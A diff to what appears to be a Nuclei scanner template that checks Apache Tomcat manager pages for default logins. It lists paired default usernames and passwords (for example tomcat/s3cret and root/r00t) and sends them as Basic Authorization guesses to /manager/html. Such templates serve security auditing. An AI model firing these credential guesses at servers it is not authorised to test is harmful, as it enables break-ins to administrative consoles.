@@ -17,80 +17,79 @@ info:
     vendor: apache
   tags: apache,default-login,tomcat,vuln
 http:
-  - attack: clusterbomb
+  - attack: pitchfork
     matchers:
       - condition: and
         # digest: 4a0a004730450221008a6ab244b09ee1e28170127512a9b09d826ac9ddccaea178849890752bcc634f022026fcfe47cddb090c3c1252869c544218e742e7b75bd75008f847994211cb13e0:922c64590222798bb761d5b6d8e72950
 
-        part: body
-        type: word
-        words:
-          - Apache Tomcat
-          - Server Information
-      - condition: or
-        part: body
-        type: word
-        words:
-          - Tomcat Version
-          - JVM Version
-          - JVM Vendor
-          - OS Name
-          - OS Version
-          - OS Architecture
-          - Hostname
-          - IP Address
-      - status:
-          - 200
-        type: status
-    matchers-condition: and
+        dsl:
+          - status_code == 200
+          - contains_all(body, "Apache Tomcat", "Server Information")
+          - contains_any(body, "Tomcat Version", "JVM Version", "JVM Vendor", "OS Name", "OS Version", "OS Architecture", "Hostname", "IP Address")
+        type: dsl
     payloads:
       password:
+        - tomcat
+        - admin
+        - manager
+        - s3cret
+        - changethis
+        - tomcat
+        - manager
+        - role1
+        - tomcat
+        - root
+        - r00t
+        - tomcat
         - ADMIN
         - OvW*busr1
-        - Password1
-        - QLogic66
-        - admanager
-        - admin
-        - adrole1
-        - adroot
-        - ads3cret
-        - adtomcat
-        - advagrant
-        - changethis
-        - demo
         - j2deployer
         - kdsxc
-        - manager
-        - owaspbwa
-        - password
-        - password1
-        - r00t
-        - role1
-        - root
-        - s3cret
-        - tomcat
-        - toor
-        - vagrant
+        - QLogic66
         - xampp
-      username:
-        - ADMIN
-        - QCC
-        - admin
-        - both
-        - cxsdk
         - demo
-        - j2deployer
+        - owaspbwa
+        - changethis
+        - s3cret
+        - changethis
+        - Password1
+        - vagrant
+        - password
+        - Password1
+        - admin123
+      username:
+        - tomcat
+        - admin
+        - admin
+        - admin
+        - admin
+        - admin
         - manager
-        - ovwebusr
-        - role
+        - role1
         - role1
         - root
-        - server_admin
-        - tomcat
+        - root
+        - both
+        - ADMIN
+        - ovwebusr
+        - j2deployer
+        - cxsdk
+        - QCC
         - xampp
+        - demo
+        - server_admin
+        - role
+        - tomcat
+        - tomcat
+        - tomcat
+        - vagrant
+        - admin
+        - admin
+        - admin
     raw:
       - |
         GET /manager/html HTTP/1.1
         Host: {{Hostname}}
         Authorization: Basic {{base64(username + ':' + password)}}
+    stop-at-first-match: true
     threads: 30
